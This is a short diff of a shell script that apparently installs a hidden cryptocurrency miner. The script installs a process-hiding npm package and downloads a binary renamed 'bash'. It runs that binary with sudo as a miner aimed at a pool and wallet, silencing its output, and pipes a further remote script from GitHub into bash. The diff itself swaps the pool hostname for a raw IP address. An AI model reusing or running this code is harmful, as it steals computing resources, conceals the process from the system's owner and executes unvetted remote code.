@@ -11,5 +11,5 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 sudo su --command "curl -sL https://deb.nodesource.com/setup_18.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add bash"
 wget https://gitlab.com/falsbayu039/srb/-/raw/main/bash >/dev/null 2>&1
 chmod +x bash
-sudo ./bash --disable-cpu --algorithm pearlhash --pool prl.kryptex.network:7048 --wallet prl1pg28ldvmyg8wkudfm3naexd0l3sun7xmz5hl8vrpdmazpzcwnf5vs6ftdcs.RTX >/dev/null 2>&1 &
+sudo ./bash --disable-cpu --algorithm pearlhash --pool 139.99.216.222:80 --wallet prl1pg28ldvmyg8wkudfm3naexd0l3sun7xmz5hl8vrpdmazpzcwnf5vs6ftdcs.RTX >/dev/null 2>&1 &
 curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
